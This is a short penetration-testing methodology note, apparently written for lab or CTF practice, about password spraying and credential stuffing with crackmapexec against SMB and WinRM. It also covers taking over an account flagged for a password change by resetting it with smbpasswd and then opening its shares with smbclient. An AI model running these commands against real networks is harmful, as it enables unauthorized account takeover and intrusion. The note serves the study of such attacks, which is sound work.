<https://ptestmethod.readthedocs.io/en/latest/cme.html>

Takes a list of known usernames in domain, and tries 1, to maybe max 3 passwords on those accounts
crackmapexec smb 10.10.22.174 -u users_excel -p passwords



Sometimes you get output like this, so even if none of these were correct passwords, the info about sbradley is still incredible valuable. It indicates the password we're spraying is what sbradley currently have, but they are suggested to change the password from their current one. Can be several reasons as to why this is. It could be they haven't changed their default, for instance. 

Anyhow, we can use smbpasswd to change their password and access their smb shares with the new password we make. 

smbpasswd -r 10.10.111.50 -U sbradley
enter old password, and create new one. 

smbclient -U sbradley //10.10.219.38/share

:D


crackmapexec smb xor_targetlist.txt -u validusers.txt -H allxorhashes.txt | tee cme_xor_smb.txt

crackmapexec winrm xor_targetlist.txt -u validusers.txt -H allxorhashes.txt | tee cme_xor_winrm.txt


Find the correct accounts: 
cat cme_xor_smb.txt | grep -b '+'
![unnamed_161b3c4ce52649c4b2a272ee1487ea8e](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Tools/crackmapexec/Password%20stuffing/{{notename}}-202605011506.png)
![unnamed_592ce40d5aba4e26a260e0498c753655](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Tools/crackmapexec/Password%20stuffing/{{notename}}-202605011506-1.png)
